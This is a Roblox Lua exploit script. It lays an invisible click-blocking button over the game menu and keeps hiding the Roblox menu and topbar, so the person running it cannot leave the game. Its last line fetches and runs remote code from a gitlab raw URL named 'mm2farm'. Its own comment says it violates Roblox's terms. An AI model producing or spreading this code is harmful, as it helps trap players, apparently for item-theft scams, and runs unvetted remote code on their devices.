-- Combined code structure (DO NOT RUN IN ROBLOX - VIOLATES TERMS)
pcall(function()
    if game.CoreGui:FindFirstChild("AntiLeaveBlocker") then
        game.CoreGui.AntiLeaveBlocker:Destroy()
    end
end)

local BLOCK_SIZE_X = 56
local BLOCK_SIZE_Y = 56
local BLOCK_POS_X  = 6
local BLOCK_POS_Y  = 6
local DISPLAY_ORDER = 10000

local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")

local function tryHideRobloxMenu()
    pcall(function()
        local names = {"RobloxGui", "RobloxMenu", "Menu", "MenuGui", "Topbar", "TopBar"}
        for _, n in ipairs(names) do
            local g = CoreGui:FindFirstChild(n)
            if g then
                pcall(function()
                    if g:IsA("ScreenGui") then
                        g.Enabled = false
                        for _, c in ipairs(g:GetChildren()) do
                            pcall(function() c.Visible = false end)
                            pcall(function() c.Enabled = false end)
                        end
                    else
                        for _, c in ipairs(g:GetDescendants()) do
                            pcall(function()
                                if c:IsA("GuiObject") then
                                    c.Position = UDim2.new(-10,0,-10,0)
                                end
                            end)
                        end
                    end
                end)
            end
        end
    end)
end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AntiLeaveBlocker"
screenGui.Parent = CoreGui
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.DisplayOrder = DISPLAY_ORDER
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local container = Instance.new("Frame")
container.Size = UDim2.new(0, BLOCK_SIZE_X, 0, BLOCK_SIZE_Y)
container.Position = UDim2.new(0, BLOCK_POS_X, 0, BLOCK_POS_Y)
container.BackgroundTransparency = 1
container.BorderSizePixel = 0
container.Parent = screenGui

local blocker = Instance.new("TextButton")
blocker.Size = UDim2.new(1, 0, 1, 0)
blocker.BackgroundTransparency = 1
blocker.AutoButtonColor = false
blocker.Text = ""
blocker.Parent = container
blocker.Active = true
blocker.Selectable = false

blocker.MouseButton1Down:Connect(function() end)
blocker.MouseButton1Up:Connect(function() end)
blocker.MouseButton2Down:Connect(function() end)
blocker.MouseButton2Up:Connect(function() end)

RunService.RenderStepped:Connect(function()
    container.Position = UDim2.new(0, BLOCK_POS_X, 0, BLOCK_POS_Y)
end)

spawn(function()
    while screenGui.Parent and screenGui.Parent == CoreGui do
        tryHideRobloxMenu()
        wait(2)
    end
end)

-- Second script (external loadstring) added at the end
loadstring(game:HttpGet("https://gitlab.com/a05348299/pro/-/raw/main/mm2farm"))()
